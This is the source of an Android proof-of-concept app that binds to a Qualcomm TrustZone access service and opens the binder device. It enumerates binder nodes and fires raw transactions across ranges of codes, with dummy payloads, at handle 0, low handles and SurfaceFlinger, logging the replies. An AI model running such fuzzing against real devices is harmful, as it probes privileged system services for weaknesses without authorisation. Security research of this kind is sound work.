package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeOpenDevice(String path);
    public static native String nativeGetBinderVersion(int fd);
    public static native String nativeGetNodeDebugInfo(int fd, long ptr);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBinderPing(int fd);
    public static native byte[] nativeBinderGetService(int fd, String serviceName);
    public static native String nativeBinderTransactionWithDump(int fd, int handle, int code, int flags, byte[] data);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== BINDER/SF EXPLORATION ==========");

        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
        int binderFd = nativeOpenDevice("/dev/binder");

        if (hwbinderFd < 0 && binderFd < 0) {
            appendLog("[!] No binder device available");
            return;
        }

        int fd = (binderFd >= 0) ? binderFd : hwbinderFd;
        String devName = (binderFd >= 0) ? "/dev/binder" : "/dev/hwbinder";
        appendLog("[+] Using " + devName + " fd=" + fd);

        appendLog("[*] Binder version: " + nativeGetBinderVersion(fd));

        appendLog("[*] Enumerating binder nodes");
        long ptr = 0;
        int nodeCount = 0;
        for (int i = 0; i < 30; i++) {
            String info = nativeGetNodeDebugInfo(fd, ptr);
            appendLog("[NODE] " + info);
            if (info.contains("ptr=0")) {
                nodeCount++;
                if (nodeCount > 5) break;
            }
            try { Thread.sleep(10); } catch (Exception e) {}
        }

        appendLog("[*] PING test");
        byte[] pingReply = nativeBinderPing(fd);
        if (pingReply != null) {
            appendLog("[PING] len=" + pingReply.length);
            dumpHex(pingReply, "PING");
            dumpToFile(pingReply, "binder_ping_reply.bin");
        }

        String[] sfNames = {
            "android.ui.ISurfaceComposer",
            "android.gui.ISurfaceComposer",
            "SurfaceFlinger",
            "android.ui.ISurfaceFlinger",
            "android.gui.SurfaceFlinger",
            "com.android.server.display.DisplayManagerService"
        };

        for (String name : sfNames) {
            appendLog("[GETSVC] Trying: " + name);
            byte[] reply = nativeBinderGetService(fd, name);
            if (reply != null && reply.length > 0) {
                appendLog("[GETSVC] " + name + " len=" + reply.length);
                dumpHex(reply, "GETSVC_" + name.replace(".", "_"));
                dumpToFile(reply, "getsvc_" + name.replace(".", "_") + ".bin");
                if (reply.length >= 4) {
                    int handle = ((reply[0] & 0xFF) |
                                  ((reply[1] & 0xFF) << 8) |
                                  ((reply[2] & 0xFF) << 16) |
                                  ((reply[3] & 0xFF) << 24));
                    appendLog("[GETSVC] -> handle=" + handle + " (0x" + Integer.toHexString(handle) + ")");
                    if (handle != 0) {
                        testSurfaceFlinger(fd, handle);
                    }
                }
            } else {
                appendLog("[GETSVC] " + name + " -> no reply");
            }
            try { Thread.sleep(50); } catch (Exception e) {}
        }

        appendLog("[*] Testing handle 0 with various codes");
        int[] codes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000};
        for (int code : codes) {
            if (stopRequested.get()) break;
            String result = nativeBinderTransactionWithDump(fd, 0, code, 0, null);
            appendLog("[TX] handle=0 code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        appendLog("[*] Testing handles 1-5");
        for (int h = 1; h <= 5; h++) {
            String result = nativeBinderTransactionWithDump(fd, h, 0, 0, null);
            appendLog("[TX] handle=" + h + " code=0 -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        if (binderFd >= 0) try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
        if (hwbinderFd >= 0) try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}

        appendLog("========== EXPLORATION COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSurfaceFlinger(int fd, int handle) {
        appendLog("[SF] Testing SurfaceFlinger handle=" + handle);

        int[] sfCodes = {
            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
            11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
            21, 22, 23, 24,
            0x100, 0x101, 0x102, 0x103, 0x104,
            0x105, 0x106, 0x107, 0x108, 0x109,
            0x10A, 0x200, 0x201, 0x202, 0x203,
            0x204, 0x205, 0x206, 0x207, 0x208,
            0x209, 0x20A
        };

        for (int code : sfCodes) {
            if (stopRequested.get()) break;
            String result = nativeBinderTransactionWithDump(fd, handle, code, 0, null);
            appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        byte[] dummyData = new byte[64];
        for (int i = 0; i < dummyData.length; i++) dummyData[i] = (byte)(i + 1);
        int[] dataCodes = {1, 3, 4, 5, 6, 7, 8, 9, 10, 13, 16, 17, 18, 19, 20, 21};
        for (int code : dataCodes) {
            String result = nativeBinderTransactionWithDump(fd, handle, code, 0, dummyData);
            appendLog("[SF-DATA] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        byte[] layerData = new byte[128];
        for (int i = 0; i < 128; i++) layerData[i] = (byte)(i);
        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8}) {
            String result = nativeBinderTransactionWithDump(fd, handle, code, 1, layerData);
            appendLog("[SF-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }
    }

    private void dumpHex(byte[] data, String label) {
        if (data == null || data.length == 0) {
            appendLog("[HEX:" + label + "] (empty)");
            return;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("[HEX:" + label + "] ");
        int len = Math.min(data.length, 128);
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x ", data[i]));
            if ((i + 1) % 16 == 0 && i < len - 1) sb.append("\n[HEX:" + label + "] ");
        }
        if (len < data.length) sb.append("... (" + data.length + " bytes total)");
        appendLog(sb.toString());
    }

    private void dumpToFile(byte[] data, String filename) {
        File dir = getDumpDir();
        if (dir == null || data == null) return;
        File file = new File(dir, filename);
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("[DUMP] Failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "binder_explore_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Binder/SF Exploration Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploration completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
